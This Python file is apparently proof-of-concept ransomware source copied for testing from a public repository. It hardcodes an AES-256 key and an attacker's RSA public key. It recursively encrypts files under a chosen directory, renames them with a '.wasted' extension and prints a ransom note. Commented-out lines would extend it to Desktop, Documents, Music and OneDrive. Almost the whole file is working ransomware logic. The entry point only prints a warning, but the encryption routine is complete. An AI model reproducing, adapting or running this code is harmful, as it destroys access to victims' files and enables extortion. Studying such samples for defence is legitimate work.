# testing code from https://github.com/jimmy-ly00/Ransomware-PoC

from Crypto.PublicKey import RSA
from Crypto import Random
from Crypto.Cipher import AES, PKCS1_OAEP
from Crypto.Util import Counter

import argparse
import os
import sys
import base64
import platform 

import discover
import modify

# -----------------
# GLOBAL VARIABLES
# CHANGE IF NEEDED
# -----------------
#  set to either: '128/192/256 bit plaintext key' or False
HARDCODED_KEY = b'+KbPeShVmYq3t6w9z$C&F)H@McQfTjWn'  # AES 256-key used to encrypt files
SERVER_PUBLIC_RSA_KEY = '''-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAvCJH+5uvyf/oJGRmC+5I
YiDnjnZjU3EAW/CrCGw7g5yp+HgVJ7kD2n42AnLsFaiswADreA9L9a3ulzvT9Q0T
qz6Habb4dzl1CLD84xtO1EVx4DJIG8jSoPiS0y1BvbEKWYv8PqcEzNyhmHCNqoiu
K73E660DAmd706GYRyGSzIo/srqGPcQ84MWtC5tmwQBZCyKDR3lYp1QEIPLhnzLG
mBd42UC1WKIebG+qi2NqmoxHubyBYVEQB/pRccVTs2TGM/RRqiLgdhz9HkvSeqpT
7HUdNulCc4bqB9d3dLqs8azciJY1c3olsDPDugDuzKkig0pHcCztzR1DkpPiGism
lQIDAQAB
-----END PUBLIC KEY-----''' # Attacker's embedded public RSA key used to encrypt AES key
SERVER_PRIVATE_RSA_KEY = '''''' # SHOULD NOT BE INCLUDED - only for decryptor purposes
extension = ".wasted" # Ransomware custom extension


def parse_args():
    parser = argparse.ArgumentParser(description='Ransomware PoC')
    parser.add_argument('-p', '--path', help='Absolute path to start encryption. If none specified, defaults to %%HOME%%/test_ransomware', action="store")

    group = parser.add_mutually_exclusive_group(required=True)
    group.add_argument('-e', '--encrypt', help='Enable encryption of files',
                        action='store_true')
    group.add_argument('-d', '--decrypt', help='Enable decryption of encrypted files',
                        action='store_true')

    return parser.parse_args()

def go():
    if len(sys.argv) <= 1:
        print('[*] Ransomware - PoC\n')
        # banner()
        print('Usage: python3 main.py -h')
        print('{} -h for help.'.format(sys.argv[0]))
        exit(0)

    # Parse arguments
    args = parse_args()
    encrypt = args.encrypt
    decrypt = args.decrypt
    
    absolute_path = str(args.path)
    
    # Force one click and comment out args above
    # absolute_path = "None"
    # encrypt = True 
    # decrypt = False
    
    if absolute_path != 'None':
        startdirs = [absolute_path]
    else:
        # Check OS
        plt = platform.system()
        if plt == "Linux" or plt == "Darwin":
            startdirs = [os.environ['HOME'] + '/test_ransomware']
        elif plt == "Windows":
            startdirs = [os.environ['USERPROFILE'] + '\\test_ransomware']
            # Can also hardcode additional directories
            # startdirs = [os.environ['USERPROFILE'] + '\\Desktop', 
                        # os.environ['USERPROFILE'] + '\\Documents',
                        # os.environ['USERPROFILE'] + '\\Music',
                        # os.environ['USERPROFILE'] + '\\Desktop',
                        # os.environ['USERPROFILE'] + '\\Onedrive']
        else:
            print("Unidentified system")
            exit(0)

    # Encrypt AES key with attacker's embedded RSA public key 
    server_key = RSA.importKey(SERVER_PUBLIC_RSA_KEY)
    encryptor = PKCS1_OAEP.new(server_key)
    encrypted_key = encryptor.encrypt(HARDCODED_KEY)
    encrypted_key_b64 = base64.b64encode(encrypted_key).decode("ascii")

    print("Encrypted key " + encrypted_key_b64 + "\n")
            
    if encrypt:
        print("[COMPANY_NAME]\n\n"
            "YOUR NETWORK IS ENCRYPTED NOW\n\n"
            "USE - TO GET THE PRICE FOR YOUR DATA\n\n"
            "DO NOT GIVE THIS EMAIL TO 3RD PARTIES\n\n"
            "DO NOT RENAME OR MOVE THE FILE\n\n"
            "THE FILE IS ENCRYPTED WITH THE FOLLOWING KEY\n"
            "[begin_key]\n{}\n[end_key]\n"
            "KEEP IT\n".format(SERVER_PUBLIC_RSA_KEY))
        key = HARDCODED_KEY
    if decrypt:
        # # RSA Decryption function - warning that private key is hardcoded for testing purposes
        rsa_key = RSA.importKey(SERVER_PRIVATE_RSA_KEY)
        decryptor = PKCS1_OAEP.new(rsa_key)
        key = decryptor.decrypt(base64.b64decode(encrypted_key_b64))
           
    # Create AES counter and AES cipher
    ctr = Counter.new(128)
    crypt = AES.new(key, AES.MODE_CTR, counter=ctr)

    # Recursively go through folders and encrypt/decrypt files
    for currentDir in startdirs:
        for file in discover.discoverFiles(currentDir):
            if encrypt and not file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                os.rename(file, file + extension)
                print("File changed from " + file + " to " + file + extension)
            if decrypt and file.endswith(extension):
                modify.modify_file_inplace(file, crypt.encrypt)
                file_original = os.path.splitext(file)[0]
                os.rename(file, file_original)
                print("File changed from " + file + " to " + file_original)
                
    # This wipes the key out of memory
    # to avoid recovery by third party tools
    for _ in range(100):
        #key = random(32)
        pass

if __name__=="__main__":
    print("Don't actually run this...")